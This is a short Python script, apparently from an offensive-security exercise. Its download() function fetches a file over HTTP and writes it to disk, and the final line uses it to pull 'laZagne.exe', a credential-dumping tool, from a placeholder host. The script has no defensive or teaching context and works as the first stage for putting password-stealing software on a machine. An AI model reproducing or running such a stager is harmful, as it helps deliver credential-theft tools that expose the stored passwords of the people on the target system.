#!/usr/bin/env python

import requests

def download(url):      # .jpg
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:      # write and binary file mode
        out_file.write(get_response.content)
    
download("http://link-holding-laZagne/laZagne.exe")

